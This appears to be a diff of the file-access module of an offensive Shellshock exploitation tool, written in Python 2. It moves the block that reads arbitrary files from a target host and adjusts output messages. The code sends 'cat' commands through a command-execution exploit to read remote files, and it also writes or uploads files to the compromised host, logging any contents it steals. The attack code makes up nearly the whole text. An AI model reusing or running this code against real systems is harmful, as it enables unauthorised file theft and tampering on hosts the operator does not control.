@@ -261,28 +261,6 @@ File Access Options
 def file_access(url, cve, check_header, filename):
 
   #-------------------------------------
-  # Read a file from the target host.
-  #-------------------------------------
-  if menu.options.file_read:
-    file_to_read = menu.options.file_read
-    # Execute command
-    cmd = "cat " + settings.FILE_READ + file_to_read
-    shell = cmd_exec(url, cmd, cve, check_header, filename)
-    if shell:
-      if menu.options.verbose:
-        print ""
-      sys.stdout.write(Style.BRIGHT + "(!) The contents of file '" + Style.UNDERLINE + file_to_read + Style.RESET_ALL + "' : \n")
-      sys.stdout.flush()
-      print shell
-      output_file = open(filename, "a")
-      output_file.write("    (!) The contents of file '" + file_to_read + "' : " + shell + ".\n")
-      output_file.close()
-    else:
-     sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read the '"+ file_to_read + "' file.\n" + Style.RESET_ALL)
-     sys.stdout.flush()
-    settings.FILE_ACCESS_DONE = True
-
-  #-------------------------------------
   # Write to a file on the target host.
    #-------------------------------------
   if menu.options.file_write:
@@ -322,7 +300,7 @@ def file_access(url, cve, check_header, filename):
     if shell:
       if menu.options.verbose:
         print ""
-      sys.stdout.write(Style.BRIGHT + "\n(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!\n" + Style.RESET_ALL)
+      sys.stdout.write(Style.BRIGHT + "(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!" + Style.RESET_ALL)
       sys.stdout.flush()
     else:
      sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_write + "' file." + Style.RESET_ALL)
@@ -363,7 +341,7 @@ def file_access(url, cve, check_header, filename):
     if shell:
       if menu.options.verbose:
         print ""
-      sys.stdout.write(Style.BRIGHT + "\n(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was uploaded successfully!\n" + Style.RESET_ALL)
+      sys.stdout.write(Style.BRIGHT + "(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was uploaded successfully!" + Style.RESET_ALL)
       sys.stdout.flush()
     else:
      sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_upload + "' file." + Style.RESET_ALL)
@@ -373,6 +351,30 @@ def file_access(url, cve, check_header, filename):
   if settings.FILE_ACCESS_DONE == True:
     print ""
 
+  #-------------------------------------
+  # Read a file from the target host.
+  #-------------------------------------
+  if menu.options.file_read:
+    file_to_read = menu.options.file_read
+    # Execute command
+    cmd = "cat " + settings.FILE_READ + file_to_read
+    shell = cmd_exec(url, cmd, cve, check_header, filename)
+    if shell:
+      if menu.options.verbose:
+        print ""
+      sys.stdout.write(Style.BRIGHT + "(!) The contents of file '" + Style.UNDERLINE + file_to_read + Style.RESET_ALL + "' : ")
+      sys.stdout.flush()
+      print shell
+      output_file = open(filename, "a")
+      output_file.write("    (!) The contents of file '" + file_to_read + "' : " + shell + ".\n")
+      output_file.close()
+    else:
+     sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read the '"+ file_to_read + "' file." + Style.RESET_ALL)
+     sys.stdout.flush()
+    settings.FILE_ACCESS_DONE = True
+
+  if settings.FILE_ACCESS_DONE == True:
+    print ""
 
 """
 The main shellshock handler
